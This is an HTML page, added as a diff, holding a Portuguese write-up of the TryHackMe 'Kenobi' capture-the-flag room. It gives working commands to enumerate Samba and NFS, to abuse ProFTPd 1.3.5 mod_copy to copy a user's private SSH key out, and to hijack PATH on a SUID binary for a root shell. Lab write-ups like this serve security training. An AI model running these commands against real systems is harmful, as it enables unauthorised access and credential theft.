@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>kenobi.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Voltar
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../pt-br/writeups/tryhackme/kenobi.html" class="active" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../en-us/writeups/tryhackme/kenobi.html" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Kenobi</h1>
+         <p class="meta">
+            TryHackMe &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Kenobi encadeia enumeração de <b>Samba</b> e <b>NFS</b>, exploração do <b>ProFTPd</b> (mod_copy) para posicionar a chave SSH em um diretório montável e, por fim, escalação de privilégios por sequestro de <b>PATH</b> em um binário SUID.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Fluxo do ataque</figcaption>
+            <svg viewBox="0 0 660 130" role="img" aria-label="Fluxo do ataque" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconhecimento</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploração - ProFTPd mod_copy</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Escalação de privilégios</tspan></text></svg>
+         </figure>
+
+         <h2>Reconhecimento</h2>
+
+         <p>O Nmap revela FTP (ProFTPd 1.3.5), SSH, HTTP, Samba e NFS. Do Samba anônimo baixa-se um log que indica a existência da chave SSH em /home/kenobi/.ssh/id_rsa. O NFS exporta /var.</p>
+
+         <pre class="code-block"><code>nmap -sC -sV &lt;IP&gt;
+smbclient //&lt;IP&gt;/anonymous -N
+get log.txt
+nmap -p111 --script=nfs-ls,nfs-showmount &lt;IP&gt;</code></pre>
+
+         <h2>Exploração - ProFTPd mod_copy</h2>
+
+         <p>O ProFTPd 1.3.5 é vulnerável ao <b>mod_copy</b> (SITE CPFR/CPTO), que copia arquivos sem autenticação. Copia-se o id_rsa para dentro de /var (exportado por NFS), monta-se o compartilhamento e recupera-se a chave.</p>
+
+         <pre class="code-block"><code>nc &lt;IP&gt; 21
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+sudo mount &lt;IP&gt;:/var /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa .
+chmod 600 id_rsa
+ssh -i id_rsa kenobi@&lt;IP&gt;</code></pre>
+
+         <h2>Escalação de privilégios</h2>
+
+         <p>Procuram-se binários SUID e destaca-se <i>/usr/bin/menu</i>, que chama <b>curl</b> por caminho relativo. Sequestrando o PATH, força-se a execução de uma shell como root.</p>
+
+         <pre class="code-block"><code>find / -perm -u=s -type f 2&gt;/dev/null
+cd /tmp
+echo /bin/sh &gt; curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
